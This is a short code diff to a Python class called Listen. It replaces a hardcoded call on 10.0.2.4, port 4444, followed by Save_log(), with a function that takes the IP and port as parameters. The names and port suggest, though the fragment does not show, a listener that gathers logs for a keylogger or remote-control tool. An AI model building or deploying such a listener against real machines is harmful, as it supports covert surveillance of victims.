@@ -40,9 +40,9 @@ class Listen():
             elif command == '2':
                 exit()
             time.sleep(10)
-
-a = Listen("10.0.2.4",4444)
-a.Save_log()
+def listen(ip,port):
+    a = Listen(f"{ip}",port)
+    a.Save_log()
             
 
                 
